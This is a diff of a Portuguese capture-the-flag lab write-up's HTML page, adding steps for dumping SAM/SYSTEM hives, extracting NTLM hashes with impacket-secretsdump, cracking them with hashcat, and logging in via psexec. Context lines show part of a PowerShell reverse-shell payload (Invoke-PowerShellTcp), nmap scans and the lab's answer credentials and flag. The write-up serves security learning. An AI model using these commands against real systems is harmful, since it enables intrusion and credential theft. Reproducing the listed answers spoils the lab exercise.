@@ -50,7 +50,7 @@ Algumas formas:
 Hashes.com CrackStation john hashcat hashcat -m 3000 test /usr/share/john/password.lst --force Resposta4RUNNER 2. 172.16.1.233 Scan inicial com nmap
 nmap -sS -Pn -A 172.16.1.233 Um possível vetor de ataque é o SMB, vamos enumerar um pouco mais com outro scan:"><meta itemprop="datePublished" content="2021-08-23T00:00:00&#43;00:00" />
 <meta itemprop="dateModified" content="2021-08-23T00:00:00&#43;00:00" />
-<meta itemprop="wordCount" content="859"><meta itemprop="image" content="https://nmmorette.github.io"/>
+<meta itemprop="wordCount" content="951"><meta itemprop="image" content="https://nmmorette.github.io"/>
 <meta itemprop="keywords" content="writeup,pentest,security,desec,DCPT,CTF," />
 <meta name="twitter:card" content="summary_large_image"/>
 <meta name="twitter:image" content="https://nmmorette.github.io"/>
@@ -260,12 +260,12 @@ if (!doNotTrack) {
 
 
 <p>Agora que temos a shell no host vamos buscar pela senha do usuário.
-Buscando por hashs com <code>hashdump</code>:</p>
+Buscando por hashes com <code>hashdump</code>:</p>
 
     <img src="https://nmmorette.github.io/images/semana08_win/hashdump.png"  class="center"  style="border-radius: 10px;"  />
 
 
-<p>Encontramos as hashs dos usuários, agora basta utilizar o <code>john</code> ou o <code>hashcat</code> para decifrar a hash do usuário nicolas.</p>
+<p>Encontramos as hashes dos usuários, agora basta utilizar o <code>john</code> ou o <code>hashcat</code> para decifrar a hash do usuário nicolas.</p>
 
 
 <br>
@@ -382,7 +382,7 @@ Vamos bucar o script primeiro:</p>
     <img src="https://nmmorette.github.io/images/semana08_win/queryuser.png"  class="center"  style="border-radius: 10px;"  />
 
 
-<p>Sabemos que o usuário CPD existe, agora precisamos de uma shell para explorar o host.
+<p>Encontramos o usuário CPD,  agora precisamos de uma shell para explorar o host e descobrir a senha.
 Vamos enviar um payload em powershell para o host usando a vulnerabilidade que descobrimos:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">function Invoke<span style="color:#f92672">-</span>PowerShellTcp 
 { 
@@ -515,7 +515,27 @@ http:<span style="color:#75715e">//www.labofapenetrationtester.com/2015/05/week-
 
 
 <p>Agora temos a shell do host.</p>
-<p>Vamos encontrar a senha solicitada.</p>
+<p>Vamos salvar os registros system10 e sam10 para obter as hashes:</p>
+
+    <img src="https://nmmorette.github.io/images/semana08_win/sam10.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Configure um compartilhamento para receber o arquivo em sua máquina:</p>
+
+    <img src="https://nmmorette.github.io/images/semana08_win/compart.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Vamos combinar os arquivos com o <code>impacket-secretsdump</code></p>
+
+    <img src="https://nmmorette.github.io/images/semana08_win/secret.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Temos a hash do usuário CPD, vamos quebrar:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">hashcat <span style="color:#f92672">-</span>m <span style="color:#ae81ff">1000</span> hashes <span style="color:#f92672">/</span>home<span style="color:#f92672">/</span>venomsnake<span style="color:#f92672">/</span>Documents<span style="color:#f92672">/</span>loncrack<span style="color:#f92672">/</span>wl.txt 
+</code></pre></div>
+    <img src="https://nmmorette.github.io/images/semana08_win/bck.png"  class="center"  style="border-radius: 10px;"  />
+
+
 
 
 <br>
@@ -524,14 +544,16 @@ http:<span style="color:#75715e">//www.labofapenetrationtester.com/2015/05/week-
   <summary>Resposta</summary>
   CPD01:bk7cpd
 </details>
-<h2 id="hahahugoshortcode-s47-hbhb7-172300103"><figure>
+<h2 id="hahahugoshortcode-s51-hbhb7-172300103"><figure>
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-terminal"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
     </figure>7. 172.30.0.103</h2>
 
     <img src="https://nmmorette.github.io/images/semana08_win/7.png"  class="center"  style="border-radius: 10px;"  />
 
 
-
+<p>Encontramos o usuário e hash anteriormente, agora precisamos quebrar o hash e descobrir a senha.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">hashcat <span style="color:#f92672">-</span>m <span style="color:#ae81ff">1000</span> hashes <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>wordlists<span style="color:#f92672">/</span>rockyou.txt 
+</code></pre></div>
 
 <br>
 
@@ -539,11 +561,17 @@ http:<span style="color:#75715e">//www.labofapenetrationtester.com/2015/05/week-
   <summary>Resposta</summary>
   DEV01:dev0105
 </details>
-<h2 id="hahahugoshortcode-s51-hbhb8-172300103"><figure>
+<h2 id="hahahugoshortcode-s55-hbhb8-172300103"><figure>
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-terminal"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
     </figure>8. 172.30.0.103</h2>
 
     <img src="https://nmmorette.github.io/images/semana08_win/8.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Mesmo processo que anterior para descobrir a senha do adm:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">hashcat <span style="color:#f92672">-</span>m <span style="color:#ae81ff">1000</span> hashes <span style="color:#f92672">/</span>usr<span style="color:#f92672">/</span>share<span style="color:#f92672">/</span>wordlists<span style="color:#f92672">/</span>rockyou.txt 
+</code></pre></div>
+    <img src="https://nmmorette.github.io/images/semana08_win/adm.png"  class="center"  style="border-radius: 10px;"  />
 
 
 
@@ -554,12 +582,16 @@ http:<span style="color:#75715e">//www.labofapenetrationtester.com/2015/05/week-
   <summary>Resposta</summary>
   ADM01:admd0458
 </details>
-<h2 id="heading"></h2>
-<h2 id="hahahugoshortcode-s55-hbhb9-172300103"><figure>
+<h2 id="hahahugoshortcode-s60-hbhb9-172300103"><figure>
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-terminal"><polyline points="4 17 10 11 4 5"></polyline><line x1="12" y1="19" x2="20" y2="19"></line></svg>
     </figure>9. 172.30.0.103</h2>
 
     <img src="https://nmmorette.github.io/images/semana08_win/9.png"  class="center"  style="border-radius: 10px;"  />
+
+
+<p>Agora que temos o usuário e senha ADM, vamos logar via <code>psexec</code> no host e buscar o arquivo confidencial:</p>
+
+    <img src="https://nmmorette.github.io/images/semana08_win/vlab.png"  class="center"  style="border-radius: 10px;"  />
 
 
 
@@ -570,7 +602,7 @@ http:<span style="color:#75715e">//www.labofapenetrationtester.com/2015/05/week-
   <summary>Resposta</summary>
   vlab{VuLnRISK10winiMC}
 </details>
-<h2 id="heading-1"></h2>
+<h2 id="heading"></h2>
 
       </div>
     </article>
@@ -609,7 +641,7 @@ http:<span style="color:#75715e">//www.labofapenetrationtester.com/2015/05/week-
           <line x1="16" y1="17" x2="8" y2="17"></line>
           <polyline points="10 9 9 9 8 9"></polyline>
         </svg>
-        859 Words
+        951 Words
       </p>
 
       <p>
@@ -730,6 +762,13 @@ http:<span style="color:#75715e">//www.labofapenetrationtester.com/2015/05/week-
         </div>
 
         <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://nmmorette.github.io/posts/2021/08/roadmap-para-ms-900/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">RoadMap para MS-900</span>
+                </a>
+            </span>
             
 
             
